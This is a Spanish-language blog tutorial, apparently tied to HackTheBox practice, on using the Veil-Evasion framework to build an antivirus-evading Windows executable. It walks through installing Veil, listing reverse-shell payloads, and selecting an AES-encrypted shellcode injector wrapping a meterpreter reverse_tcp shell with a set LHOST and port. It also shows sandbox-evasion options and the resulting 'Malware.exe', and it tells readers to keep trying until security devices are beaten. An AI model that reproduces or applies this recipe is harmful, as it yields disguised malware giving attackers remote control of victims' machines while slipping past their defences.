---
layout: post
title: "Como evadir la deteccion de un Firewall I"
excerpt: "Como usar Veil/Evasion desde 0"
image: "https://hackingprofessional.github.io/Security/images/VeilEvasion.png"
tags: 
  - Penetration Testing.
  - Hacking desde 0
  - Evadiendo firewall's
---

Uno de los problemas más importantes que un hacker debe abordar, es cómo superar dispositivos de seguridad y permanecer sin ser detectado.
Estos pueden ser Firewalls, antivirus, sistemas de detección de intrusos (IDS), cortafuegos de aplicaciones web, Sistema de prevención de intrusos (IPS) y muchos otros. Varios de estos dispositivos emplean un esquema de detección basado en firmas donde mantienen una base de datos de malware o exploits conocidos y firmas de carga útiles, la recomendado para evadir esto es:

    - 1.) Generar el exploit
    - 2.) Cambiar la firma del exploit

En el dia de hoy, vamos aprender a recodificar un payload o carga util para ocultar la firma conocida de este; la herramienta que nos ayudara a realizar esto es conocida como Veil-Evasion.

[Veil-Evasion](https://github.com/Veil-Framework/Veil) fue desarrollado específicamente para permitirle cambiar la firma de su carga útil. Está escrito en Python, y tiene numerosos codificadores que le permiten reescribir su código para evadir la detección de múltiples maneras.

## Instalacion
Inicialmente vamos a instalar nuestra herramienta con el siguiente comando:

```zsh
git clone https://github.com/Veil-Framework/Veil.git
╭─[~/Desktop/APOLO/Tools]─[root@Arthorias]─[0]─[3457]
╰─[:)] # cd Veil/
╭─[~/Desktop/APOLO/Tools/Veil]─[root@Arthorias]─[0]─[3457]
╰─[:)] # ./config/setup.sh --force --silent
```

Luego de lo anterior, se instalaran varias herramientas que son necesarias para poder correr Veil/Evasion.

## Generando una carga útil cifrada para evadir la detección
Para iniciar Veil-Evasion ejecutamos lo siguiente:

```zsh
╭─[~/Desktop/APOLO/Tools/Veil]─[root@Arthorias]─[0]─[3457]
╰─[:)] # ./Veil.py
```

<figure>
  <img src="https://hackingprofessional.github.io/Security/images/ExecVeil.png" width="40%" height="55%">
	<figcaption>
    <a href="https://hackingprofessional.github.io/Security/" title="Ejecutando Veil">Iniciando Veil</a>.
  </figcaption>
</figure>

Seleccionamos la herramienta, Evasion.

<figure>
  <img src="https://hackingprofessional.github.io/Security/images/UsingEvasion.png" width="40%" height="55%">
	<figcaption>
    <a href="https://hackingprofessional.github.io/Security/" title="Usando Evasion">Usando Evasion</a>.
  </figcaption>
</figure>

A continuacion, vamos a crear un archivo .EXE que contendrá una carga útil que nos permita tener acceso y control al sistema de la víctima. 
Para que funcione el ataque, la víctima debe hacer click en nuestro archivo malicioso y ejecutarlo. 
Con el comando **list** se nos desplegara una lista de todas las cargas útiles con las que puede trabajar con Veil/Evasion.

```shell
Veil/Evasion>: list
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================


 [*] Available Payloads:

	1)	autoit/shellcode_inject/flat.py

	2)	auxiliary/coldwar_wrapper.py
	3)	auxiliary/macro_converter.py
	4)	auxiliary/pyinstaller_wrapper.py

	5)	c/meterpreter/rev_http.py
	6)	c/meterpreter/rev_http_service.py
	7)	c/meterpreter/rev_tcp.py
	8)	c/meterpreter/rev_tcp_service.py

	9)	cs/meterpreter/rev_http.py
	10)	cs/meterpreter/rev_https.py
	11)	cs/meterpreter/rev_tcp.py
	12)	cs/shellcode_inject/base64.py
	13)	cs/shellcode_inject/virtual.py

	14)	go/meterpreter/rev_http.py
	15)	go/meterpreter/rev_https.py
	16)	go/meterpreter/rev_tcp.py
	17)	go/shellcode_inject/virtual.py

	18)	lua/shellcode_inject/flat.py

	19)	perl/shellcode_inject/flat.py

	20)	powershell/meterpreter/rev_http.py
	21)	powershell/meterpreter/rev_https.py
	22)	powershell/meterpreter/rev_tcp.py
	23)	powershell/shellcode_inject/psexec_virtual.py
	24)	powershell/shellcode_inject/virtual.py

	25)	python/meterpreter/bind_tcp.py
	26)	python/meterpreter/rev_http.py
	27)	python/meterpreter/rev_https.py
	28)	python/meterpreter/rev_tcp.py
	29)	python/shellcode_inject/aes_encrypt.py
	30)	python/shellcode_inject/arc_encrypt.py
	31)	python/shellcode_inject/base64_substitution.py
	32)	python/shellcode_inject/des_encrypt.py
	33)	python/shellcode_inject/flat.py
	34)	python/shellcode_inject/letter_substitution.py
	35)	python/shellcode_inject/pidinject.py
	36)	python/shellcode_inject/stallion.py

	37)	ruby/meterpreter/rev_http.py
	38)	ruby/meterpreter/rev_https.py
	39)	ruby/meterpreter/rev_tcp.py
	40)	ruby/shellcode_inject/base64.py
	41)	ruby/shellcode_inject/flat.py
```

Para usar uno de estos payloads, simplemente debemos indicarlo con el numero que identifica al payload.  
Vamos a crear el nuestro, el cual es: 
*29) python/shellcode_inject/aes_encrypt.py*  

Este utiliza la inyección de VirtualAlloc junto con el cifrado AES, **(NOTA: AES es el Estándar de cifrado avanzado, generalmente considerado como uno de los cifrados más sólidos actualmente disponibles.)** de esta manera lograremos ofuscar la verdadera naturaleza del software y podremos burlar ciertos antivirus.

*NOTA:* Este tipo de payload utiliza la funcion de VirtualAlloc , la cual crea un área ejecutable en la memoria virtual para el código de la shell y luego bloquea esa área de memoria en la memoria física.

Si deseas ver informacion sobre cualquiera de los payloads de Veil/Evasion se hace de la siguiente manera:

```console
Veil/Evasion>: info 29

Payload: python/shellcode_inject/aes_encrypt selected

 Required Options:

Name            	Value   	Description
----            	-----   	-----------
CLICKTRACK      	X       	Optional: Minimum number of clicks to execute payload
COMPILE_TO_EXE  	Y       	Compile to an executable
CURSORMOVEMENT  	FALSE   	Check if cursor is in same position after 30 seconds
DETECTDEBUG     	FALSE   	Check if debugger is present
DOMAIN          	X       	Optional: Required internal domain
EXPIRE_PAYLOAD  	X       	Optional: Payloads expire after "Y" days
HOSTNAME        	X       	Optional: Required system hostname
INJECT_METHOD   	Virtual 	Virtual, Void, or Heap
MINRAM          	FALSE   	Check for at least 3 gigs of RAM
PROCESSORS      	X       	Optional: Minimum number of processors
SANDBOXPROCESS  	FALSE   	Check for common sandbox processes
SLEEP           	X       	Optional: Sleep "Y" seconds, check if accelerated
USERNAME        	X       	Optional: The required user account
USERPROMPT      	FALSE   	Make user click prompt prior to execution
USE_PYHERION    	N       	Use the pyherion encrypter
UTCCHECK        	FALSE   	Optional: Validates system does not use UTC timezone
VIRTUALDLLS     	FALSE   	Check for dlls loaded in memory
VIRTUALFILES    	FALSE   	Optional: Check if VM supporting files exist
```

```shell
# Ejemplo de como indicarle a Veil-Evasion el uso del payload, 29) python/shellcode_inject/aes_encrypt.py
use 29
```

Luego de seleccionar el payload a usar, vamos a generarlo y configurar las opciones que son necesarias para el correcto funcionamiento de este. 

<script id="asciicast-239315" src="https://asciinema.org/a/239315.js" async></script>

*Nota:* Luego del comando **generate**, Seleccionamos en shellcode utilizar "msfvenom" el cual usara como predeterminado:  
**windows/meterpreter/reverse_tcp**
Configuramos el parametro LHOST, indicando nuestra IP. (10.10.14.7)
Configuramos el parametro LPORT, indicando el puerto por donde queremos recibir nuestra conexion. (6969)

Cuando terminemos de ingresar la información apropiada para nuestro payload, se iniciará a generar nuestra Shell. 

```zsh
╭─[/var/lib/veil/output/compiled]─[root@Arthorias]─[0]─[3473]
╰─[:)] # l
total 19M
drwxr-xr-x 2 root root 4.0K Apr  6 14:18 .
drwxr-xr-x 5 root root 4.0K Apr  6 11:47 ..
-rwxr-xr-x 1 root root 4.6M Apr  6 11:47 danger.exe
-rwxr-xr-x 1 root root 4.6M Apr  6 14:06 EvilTally.exe
-rwxr-xr-x 1 root root 4.6M Apr  6 14:18 Malware.exe      <--------> Nuestro Malware Generado.
-rwxr-xr-x 1 root root 4.6M Apr  6 13:33 Tally.exe
╭─[/var/lib/veil/output/compiled]─[root@Arthorias]─[0]─[3474]
```

Como se puede ver en la captura de pantalla anterior, Veil/Evasion ha generado un nuevo archivo ".exe" que he llamado "Malware.exe" (Puede nombrarlo como usted desee).
Y listo, tenemos nuestro payload ofuscado.
Si estas interesado en como puedo usar este payload, te invito a mi siguiente [post]() donde hago una demostracion en un entorno de pruebas controlado sobra la maquina Tally de HackTheBox.

## Conclusion
Evadir los antivirus y los dispositivos de seguridad es una de las tareas más importantes de un hacker, y Veil-Evasion es otra herramienta que deberiamos tener en nuestro arsenal. Sin embargo, se debe tener en cuenta que NUNCA hay una solución única y final.
Todo Hacker debe ser persistente y creativo para encontrar maneras de superar estos dispositivos, de modo que si un método falla, intente con otro, luego intente con otro, hasta que encuentre uno que funcione.


